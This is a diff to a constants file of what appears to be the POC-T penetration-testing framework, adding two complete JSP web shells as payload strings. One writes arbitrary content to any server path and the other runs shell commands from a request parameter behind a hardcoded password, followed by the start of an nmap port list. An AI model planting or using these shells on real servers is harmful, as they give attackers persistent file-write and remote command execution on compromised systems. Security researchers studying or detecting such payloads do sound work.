@@ -3,6 +3,51 @@
 # author = i@cdxy.me
 # project = https://github.com/Xyntax/POC-T
 
+JSP_UPLOAD = """<%@page contentType="text/html; charset=GBK" import="java.io.*;"%>
+<html><head><title>JSP</title></head><body bgcolor="#ffffff">
+<%
+String path=request.getParameter("path");
+String content=request.getParameter("content");
+String url=request.getRequestURI();
+String relativeurl=url.substring(url.indexOf('/',1));
+String absolutepath=application.getRealPath(relativeurl);
+if (path!=null && !path.equals("") && content!=null && !content.equals("")){
+  try{
+    File newfile=new File(path);
+    PrintWriter writer=new PrintWriter(newfile);
+    writer.println(content);
+    writer.close();
+    if (newfile.exists() && newfile.length()>0){
+      out.println("<font size=3 color=red>save success!</font>");
+    }else{
+      out.println("<font size=3 color=red>save failed!</font>");
+    }
+  }catch(Exception e){
+    e.printStackTrace();
+  }
+}
+out.println("<form action="+url+" method=post>");
+out.println("<font size=3>save path:<br></font><input type=text size=54 name='path'><br>");
+out.println("<font size=3 color=red>current path "+absolutepath+"</font><br>");
+out.println("<textarea name='content' rows=15 cols=100></textarea><br>");
+out.println("<input type='submit' value='save!'>");
+out.println("</form>");
+%>
+</body></html>"""
+
+JSP_RCE = """<%
+    if("023".equals(request.getParameter("pwd"))){
+        java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("i")).getInputStream();
+        int a = -1;
+        byte[] b = new byte[2048];
+        out.print("<pre>");
+        while((a=in.read(b))!=-1){
+            out.println(new String(b,0,a));
+        }
+        out.print("</pre>");
+    }
+%>"""
+
 NMAP_PORTS_1000 = \
     ['1', '3', '4', '6', '7', '9', '13', '17', '19', '20', '21', '22', '23', '24', '25', '26', '30', '32', '33',
      '37', '42', '43', '49', '53', '70', '79', '80', '81', '82', '83', '84', '85', '88', '89', '90', '99', '100',
